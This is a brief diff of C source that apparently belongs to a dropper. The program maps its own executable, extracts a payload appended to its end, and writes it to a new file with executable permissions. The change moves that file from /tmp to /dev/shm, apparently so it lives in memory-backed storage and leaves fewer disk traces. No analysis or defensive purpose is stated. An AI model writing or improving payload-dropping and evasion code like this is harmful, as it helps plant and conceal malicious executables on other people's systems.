@@ -27,7 +27,7 @@ int main() {
     int self_hdl = open(path, O_RDONLY, 0);
     void *self = mmap(NULL, st_sz, PROT_READ, MAP_PRIVATE, self_hdl, 0);
 
-    char filepath[15] = "/tmp/cJ8f0asjf";
+    char filepath[15] = "/dev/shm/cJ8f0a";
     int handle = open(filepath, O_RDWR | O_CREAT, 0700);
     write(handle, self+(st_sz-PAYLOAD_SIZE), PAYLOAD_SIZE);
     close(handle);
